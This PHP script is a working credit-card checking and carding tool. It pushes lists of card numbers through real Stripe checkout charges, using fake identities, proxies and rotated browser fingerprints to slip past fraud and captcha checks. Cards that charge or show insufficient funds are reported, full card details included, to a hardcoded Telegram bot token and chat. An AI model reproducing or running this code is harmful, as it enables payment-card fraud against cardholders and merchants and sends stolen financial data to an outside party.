<?php

error_reporting(0);
$timezones = timezone_identifiers_list();
$random_timezone = $timezones[array_rand($timezones)];
date_default_timezone_set($random_timezone);

// Random information API
$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
$a = json_decode($resp);
$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
$name = $a->hello->person->first_name ?? "xiao";
$lname  = $a->hello->person->last_name ?? "tempest";
$phone      = $a->hello->person->phone;
$ua         = $a->hello->person->ua;
$street     = $a->hello->street->name ?? "314 alden ave";
$city       = $a->hello->street->city ?? "rohnert park";
$zip        = $a->hello->street->zip ?? "94928";
$state      = $a->hello->street->state ?? "CA";
$state_full = $a->hello->street->state_full ?? "California";
$regionId   = $a->hello->street->regionId ?? "12";
$country    = $a->hello->street->country ?? "United States";
$fivenums   = rand(1000, 9999); // Generate 5 random numbers


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$lista = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$colink = urlencode($_GET['colink']);
$xamount = $_GET['xamount'];
$xemail = $_GET['xemail'];


$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$proxy = !empty($ip) ? $ip : '';
$proxyauth = !empty($hydra) ? $hydra : '';

$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed

$ch = curl_init();
$testmyip = 'https://api.ipify.org/';
curl_setopt($ch, CURLOPT_URL,$testmyip);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$curl_scraped_page = curl_exec($ch);
$curl_error = curl_error($ch);
curl_close($ch);

if ($curl_error) {
    echo "<span style='background-color: white; color: red;' class='badge'>$curl_error</span><br><br>";
    exit();
}

echo "$curl_scraped_page<br>";

#########if the co link has tos
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl2 = curl_exec($ch);
curl_close($ch);

#########1st
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl0 = curl_exec($ch);
curl_close($ch);

 
$pm = Getstr($curl0,'"id": "','"');
 "<br>";
 "<br>";


##########2nd
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl1 = curl_exec($ch);
curl_close($ch);

 
$three_d_secure_2_source = Getstr($curl1,'"three_d_secure_2_source": "','"');

$client_secret = Getstr($curl1,'"client_secret": "','"');
"<br>";
$pi = Getstr($curl1,'"client_secret": "','_secret_');
"<br>";
"<br>";
$dc2 = Getstr($curl1,'"decline_code": "','"');
$mes1 = Getstr($curl1,'"message": "','"');
$success = Getstr($curl1,'"success_url": "','"');
$tos = Getstr($curl2,'"terms_of_service": "','"');

#############3rd


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, 1);

// random user-agents
$userAgents = array(
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
);

$randomUserAgents = array();

for ($i = 0; $i < 10; $i++) {
  $randomUserAgents[] = $userAgents[array_rand($userAgents)];
}

// Now you can use $randomUserAgents array in your postfield
$postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22'.$randomUserAgent.'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pklive.'';

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $result = curl_exec($ch);
curl_close($ch);

 "<br>";
 "<br>";
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pklive.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result1 = curl_exec($ch);
curl_close($ch);

 $result1;
 $dcode1 = json_decode($result1)->last_payment_error->decline_code;
 "<br>";
 "<br>";
 "<br>";
 $mes2 = Getstr($result1,'"message": "','"');
 $status = Getstr($result1,'"status": "','"');
 $msg = json_decode($result1)->last_payment_error->message;
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'?key='.$pklive.'&eid=NA');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result2 = curl_exec($ch);
curl_close($ch);

$result2;
$dcode2 = json_decode($result2)->last_payment_error->decline_code;
$currency = json_decode($result2)->currency;

//* Start of getting BIN Information *//

// Get the first 6 digits (BIN) of the credit card number
$bin = substr($credit_card, 0, 6);

// Lookup the BIN database from https://binlist.net/ with 5 retries
$max_attempts = 3; // maximum number of attempts to make
$attempt = 0; // current attempt number

$binlist_response = false;

while(!$binlist_response && $attempt <= $max_attempts) {
    $binlist_api_url = "https://lookup.binlist.net/" . $cc;
    $binlist_response = @file_get_contents($binlist_api_url); // use @ to suppress errors
    $binlist_data = json_decode($binlist_response, true);

    //if(!empty($binlist_data)) {
        // data found, break out of the loop
        //break;
    //}

    // increment attempt counter
    $attempt++;

    // wait for 1 second before sending the next request
    //sleep(1);
}

// check if valid data was found
if(!empty($binlist_data)) {
    $find_cc_country = isset($binlist_data['country']['alpha2']) ? $binlist_data['country']['alpha2'] : '';
    $cctype = isset($binlist_data['type']) ? $binlist_data['type'] : '';
    $find_bank_name = isset($binlist_data['bank']['name']) ? $binlist_data['bank']['name'] : '';

    if(!empty($find_cc_country)){
        $cc_country = "<span class='badge badge-secondary'>$find_cc_country</span>";
    }
    if(!empty($find_bank_name)){
        $bank_name = "<span class='badge badge-secondary'>$find_bank_name</span>";
    }
} else {
    // no valid data found after maximum attempts
    // handle error here, e.g. display an error message
}


// Check if the input is a CVV or CCN
#$cctype = (preg_match('/^\d{3,4}$/', $cc)) ? 'CVV' : ((preg_match('/^\d{12,19}$/', $cc)) ? 'CCN' : 'Unknown');

// Check if the card type is debit or credit
if(strtolower($cctype) == 'debit'){
  $cctype = '<span class="badge badge-secondary">Debit</span>';
} else if(strtolower($cctype) == 'credit'){
  $cctype = '<span class="badge badge-secondary">Credit Card</span>';
} else {
  $cctype = '';
}

// Check the card type
if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa</span>';
} elseif (preg_match('/^5[1-5][0-9]{14}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Mastercard</span>';
} elseif (preg_match('/^3[47][0-9]{13}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">American Express</span>';
} elseif (preg_match('/^6(?:011|5[0-9][0-9])[0-9]{12}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Discover</span>';
} elseif (preg_match('/^(?:2131|1800|35\d{3})\d{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">JCB</span>';
} elseif (preg_match('/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Diners Club</span>';
} elseif (preg_match('/^(62|88)\d{16}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">UnionPay</span>';
} elseif (preg_match('/^(5[06789]|6)[0-9]{10,17}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Maestro</span>';
} elseif (preg_match('/^4(026|17500|405|508|844|91[37])/', $cc)) {
    $scheme = '<span class="badge badge-secondary">Visa Electron</span>';
} elseif (preg_match('/^6[0-9]{15}$/', $cc)) {
    $scheme = '<span class="badge badge-secondary">RuPay</span>';
} else {
    $scheme = '';
}

#############SEND TO TG BOT WHEN CHARGED
$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
$chatID = urlencode('-1001808253666');
$charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.$success.'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AChecked%20from:%0A'.$domain.'';
$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$charged_message.'';

#############SEND TO TG BOT WHEN INSUFFBAL
$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
$chatID = urlencode('-1001808253666');
$insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount%20to%20bill:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked%20from:%0A'.$domain.'';
$sendinsuff = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$insuf_message.'';

#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;


#############SUCCEEDED SUCCESS
 if (strpos($result1, '"status": "succeeded"')) {
    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg</span> ";
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo "\u{1F4B0}\u{2705}<br>"; // outputs 💰✅
}
    exit();
}
#############DECLINECODEcurl0
elseif(strpos($curl0, 'card_not_supported')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>card_not_supported $status</span><br>";
    exit();
}
elseif(strpos($curl0, 'generic_decline')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
    exit();
}
elseif(strpos($curl0, 'intent_confirmation_challenge')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
    exit();
}
elseif($tos == "required") {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
    sleep(1);
    exit();
}
if (strpos($curl0, '"insufficient_funds"')) {
    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
}
    exit();
}

#############DECLINECODEcurl1
elseif(strpos($curl1, 'fraudulent')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>fraudulent $status</span><br>";
    exit();
}
elseif(strpos($curl1, 'incorrect_number')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>incorrect_number $status</span><br>";
    exit();
}
elseif(strpos($curl1, 'invalid_account')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>invalid_account $status</span><br>";
    exit();
}
elseif(strpos($curl1, 'generic_decline')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
    exit();
}
elseif(strpos($curl1, 'intent_confirmation_challenge')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
    exit();
}
elseif(strpos($curl1, '"status": "requires_action"')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>NEED OTP $status</span><br>";
    exit();
}
elseif($tos == "required") {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
    exit();
}
if (strpos($curl1, '"insufficient_funds"')) {
    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
}
    exit();
}

#############DECLINECODEresult1
elseif(strpos($result1, 'payment_intent_authentication_failure')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>The provided Payment Method has failed authentication. $status</span><br>";
    exit();
}
elseif(strpos($result1, 'BEGIN CERTIFICATE')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3D SECURED CARD $status</span><br>";
    exit();
}
elseif(strpos($result1, 'fraudulent')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>fraudulent $status</span><br>";
    exit();
}
elseif(strpos($result1, 'generic_decline')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
    exit();
}
elseif(strpos($result1, 'intent_confirmation_challenge')) {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
    exit();
}
elseif($tos == "required") {
    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
    exit();
}
if (strpos($result1, '"insufficient_funds"')) {
    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
    while (!$sendinsufftotg && $num_retries < $max_retries) {
    $sendinsufftotg = @file_get_contents($sendinsuff);
    $num_retries++;
    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
}
    exit();
}

#############ELSEDECLINE
 else
   {
$d_code = "";
if (!empty($dc2)) {
  $d_code = $dc2;
} else if (!empty($dcode1)) {
  $d_code = $dcode1;
} else if (!empty($dcode2)) {
  $d_code = $dcode2;
} else if (!empty($mes1)) {
  $d_code = $mes1;
} else if (!empty($mes2)) {
  $d_code = $mes2;
} else if (!empty($msg)) {
  $d_code = $msg;
}
     echo"<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed $d_code</span><br>";
     exit();
   }
 
?>